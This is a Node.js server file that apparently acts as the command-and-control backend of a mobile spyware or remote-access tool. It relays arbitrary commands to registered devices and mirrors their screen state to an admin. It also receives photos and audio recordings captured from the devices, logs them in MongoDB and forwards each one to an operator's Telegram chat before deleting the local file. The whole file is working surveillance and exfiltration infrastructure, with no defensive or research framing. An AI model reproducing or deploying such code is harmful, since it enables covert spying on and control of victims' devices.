const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { MongoClient } = require('mongodb');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// Multer Setup for Uploads
const upload = multer({ dest: 'uploads/' });
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(express.json());
app.use(express.static('public'));

// MongoDB
let db;
(async () => {
    const client = new MongoClient(process.env.MONGODB_URI);
    await client.connect();
    db = client.db('csk4_advanced');
    console.log('✅ MongoDB Connected');
})();

// Socket.IO
io.on('connection', (socket) => {
    socket.on('register_device', (deviceId) => {
        socket.join(deviceId);
        io.emit('device_list', deviceId);
        console.log(`📱 Device Online: ${deviceId}`);
    });

    socket.on('register_admin', () => socket.join('admin'));

    socket.on('command', (data) => {
        io.to(data.deviceId).emit('execute_command', data);
    });

    socket.on('screen_state', (data) => {
        io.to('admin').emit('screen_state_update', data);
    });
});

// Upload Endpoints (Camera & Audio)
app.post('/api/upload/photo', upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;
        if (!req.file) return res.status(400).send('No file');
        
        await db.collection('photos').insertOne({ deviceId, path: req.file.path, time: new Date() });
        await bot.sendPhoto(CHAT_ID, req.file.path, { caption: `📷 Photo from ${deviceId}` });
        
        fs.unlinkSync(req.file.path); // Cleanup
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/upload/audio', upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;
        if (!req.file) return res.status(400).send('No file');
        
        await db.collection('audio').insertOne({ deviceId, path: req.file.path, time: new Date() });
        await bot.sendAudio(CHAT_ID, req.file.path, { caption: `🎤 Audio from ${deviceId}` });
        
        fs.unlinkSync(req.file.path);
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

server.listen(process.env.PORT || 4000, () => console.log('🚀 Server Live on Port ' + (process.env.PORT || 4000)));
